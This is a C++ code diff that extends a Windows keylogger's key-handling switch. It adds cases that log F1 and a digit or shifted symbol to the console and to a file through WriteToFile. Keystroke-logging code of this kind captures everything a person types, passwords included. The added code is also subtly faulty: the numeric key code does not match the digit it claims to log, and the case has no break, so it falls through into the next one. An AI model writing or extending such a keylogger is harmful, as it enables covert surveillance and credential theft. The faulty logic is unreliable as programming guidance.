@@ -22,6 +22,25 @@ bool Key_is_Listed(WORD iKey)
 		WriteToFile(" ");
 		break;
 
+	case VK_F1:
+		std::cout << "*F1*";
+		WriteToFile("*F1*");
+		break;
+
+	case 33:
+		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
+		{
+			iKey += '!';
+			std::cout << "!";
+			WriteToFile("!");
+		}
+		else
+		{
+			iKey += '1';
+			std::cout << "1";
+			WriteToFile("1");
+		}
+
 	case VK_RETURN:
 		std::cout << "\n";
 		WriteToFile("\n");
